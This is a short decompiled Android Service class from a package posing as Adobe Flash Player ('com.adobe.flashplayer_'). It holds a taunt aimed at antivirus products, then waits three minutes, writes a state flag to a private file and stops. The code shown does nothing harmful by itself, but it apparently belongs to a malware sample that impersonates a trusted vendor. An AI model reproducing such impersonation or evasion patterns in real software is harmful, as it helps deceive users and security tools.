package com.adobe.flashplayer_;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.CountDownTimer;
import android.os.IBinder;
import java.io.IOException;
import java.io.OutputStreamWriter;

public class MacrosStat extends Service {
    public void onCreate() {
        super.onCreate();
        String str = "";
        str = new StringBuilder(String.valueOf("Hello, fuckin AVs!" + "We have a little surprise!")).append("Ha-ha!").toString();
        new CountDownTimer(180000, 180000) {
            public void onTick(long millisUntilFinished) {
            }

            public void onFinish() {
                MacrosStat.this.writeConfig("MacrosAState", "E", MacrosStat.this.getApplicationContext());
                MacrosStat.this.stopSelf();
                MacrosStat.this.onDestroy();
            }
        }.start();
    }

    /* access modifiers changed from: private */
    public void writeConfig(String config, String data, Context context) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }

    public IBinder onBind(Intent arg0) {
        return null;
    }

    public void onDestroy() {
        super.onDestroy();
    }
}
